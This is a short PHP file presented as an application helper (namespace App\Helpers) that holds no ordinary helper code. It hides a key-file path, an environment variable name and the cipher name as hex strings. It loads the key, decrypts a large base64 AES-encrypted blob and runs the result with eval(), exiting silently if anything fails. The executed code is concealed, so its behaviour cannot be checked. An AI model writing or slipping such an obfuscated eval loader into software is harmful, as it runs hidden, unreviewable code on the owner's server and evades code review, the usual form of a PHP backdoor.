<?php
namespace App\Helpers;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('DKXA+2W15mTN/mf1j7ei0g==');

$c=base64_decode(

'E7XUtHxwueOWFJbL8c2wBP2w5sU6ZhNfRU96/MJHJ4IGsiyF9pXTHnpTaUbgCHuPs/Ls8nEzn1bH' .
'pnmhI03GT4hOCc1pvAINE1popI2tRs4uDpJpQX6LhNYKDXsvgrCtkvlZ0vUy2d9xCGQA+p34y8HV' .
'H2Tesm93RQRW/EOFZfYCYFS9MgI32n2I0t9zshH9Q3xpVD0upngZ3vivipbZHmWyUAoTF7kFgHaf' .
'BlPNHSPQTywqNM/TdPISV8QufydNlduN7gsLkfznK+i745Quxq43lRn0z4x0t8T8N9M9soUfq0u/' .
'dhMTJRKiFPGx6T/oqMcKL3PJu7PqucBc9g+PdicCyQ3vru17RVj+Od3gUYr0HX1bEcK+JW1vShb8' .
'+TaOCWo9jWO7ksfp6yxplJsPlmdjSXWP6Y+WTzjdmStDoP0/Kbl6q7kWGmAsTh2knIesLKaHDa4f' .
't7YEb/Od7zDIRYRtZNE9asTPMdiDO4B0evlbnuZmFqiS080mI99yJ09HndpSyLwUSZx5A0Y0IEeO' .
'Qc3xKTPXQ5qKCyq0OCD4Z41AKG1xHasKQwT15ZKvq0wCHhe9gpJLkRLKwWWI0jq6Lizwjuz+56vg' .
'rHPKk9qQjxVrMQg75Gb1u59Bz+NQfj18RHMtNEtswoamqo91c6wmF+JB/PeZu0BXuTpOZvxTSQDa' .
'Y6gvM1WeHoMuw59mF+N5Df+NbCj7SgFTjparJmM76bqh9uci4tAlGyAny/bkKrTBq0nHKbnv2MJj' .
'i7LF+oGcNS+I1lXYg3dBbNIAowO6OR+oRJ1EhMNwKVWPvcqhUCqxDPi1oBFfAXbmzSj4ghSn5y59' .
'neNJhtAG0sHecrO7Bag1pUTOV1yasUWnxVgXvTmMp6MSTRJIkax0B3q/W6o6aoMsyX438cXwkm6v' .
'2ZEFIRje3cCT7gzJBzJFPzUKR9vz4k+vQALsO3IHqN3iG33s732gFJQ7rxq0lOmqIPBGenjVGzdl' .
'EqJ20PBR+7XB/pk5Rop/7xKfmAf3bCXJWZDCCkHHys3GGdUklzcYwXUcOfviR1xWdp5Cn+vLTANA' .
'EX2V4UGO4CNla05zD3l8LwRKHLGzt66IxjPnHMqoPnKrwUQO5Ql/zuiMDRTlmmwygYDnPqRiy1US' .
'0sVHMrKbZgurxN8O3O2F6IlD1+CPLRBLSCA6lGaOH8VDTAVBbYEygvzcc1RHYpleSELuuUAIlxkp' .
'Ap4xsN4gD91iVcpWsnWG3Meb/fHzrBf8kVVvi2cr5fE7zvHj9WNmyZW/0MnyuTgF3xKqZDFgibvd' .
'us4hUVmpRA1ejzw3fOVw4oSVUKit65A4xBnXzA9xc6CzWSWoFi051S5+jc9lAjGaj4e9qP8roKPk' .
'w90U9wb+oYXhpd3ClAGhDeqhBiTAYh7usxrZ0SvVda4sLMIPHKx+YICgwNqsqOvrBcxUpdz2wgyU' .
'M2Ebqoh8zG9Q6DKx8D5bjG2cXp1FWX5ZQdKl1He8d9yp0FGUndk3beL25ip+qmh0BkEiPcHV1zoU' .
'Y9BfiGs36C2C6hmue8nWC9cx9XewafjHZP4BnluU40KFQ2SOuV7olRbQzrPeB5sueeUYRsUSWsjW' .
'V7W3lHF7xqRbodM2tfyHpUtHROBVzYzSdeV1yUu+CGmUvEknhcZFEXSrdIRd3lcwukAO2fXGEGwF' .
'KoQn/4dKD0BpcRzsiLbUVZh5v2uT+zj/8aPRGiXQRuGsBLYSJ2FZLFExwjB2C8ZMp57IbUSWN1Uq' .
'4JBd+9fl3zyTDBA+y0XBjsoIcgzrV0TJHp+N9y0DtFbIyYrx4EiDaleo3Vjumo+X1sjqiUHv5WYW' .
'uy9Fv7M+BYLjj4zSsMAjt+ctw+hxxg4LESOwJv5LIvogIEHNDxiPKdmVgzMdwrRyFEy3qAQxvOsU' .
'8lH4FWuU+LmkmiQFh7XeRu9EowTtW2cSK+lawG367Z/RQNaTkSjy528PXDzW87ZnDKV9vz0Bh9s8' .
'm1ALzu2gHblCswVC4qfv1uZRFOFRIhqyqsYa+FzGnpkBZuzkqzJsidCaSgYsTD4/DvNX1SktFMqn' .
'oieYegxJullumZWhEvv4HYRm2E05H6ERIkvKoLNx9Mr3OCt7Fm5QfsinV7cB/rdl99l6zFZhuxCG' .
'yzZbVpr+NSqaz03Zh6CpAtQQo6bBKK2L5IzMupPT/GLcri+h'

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

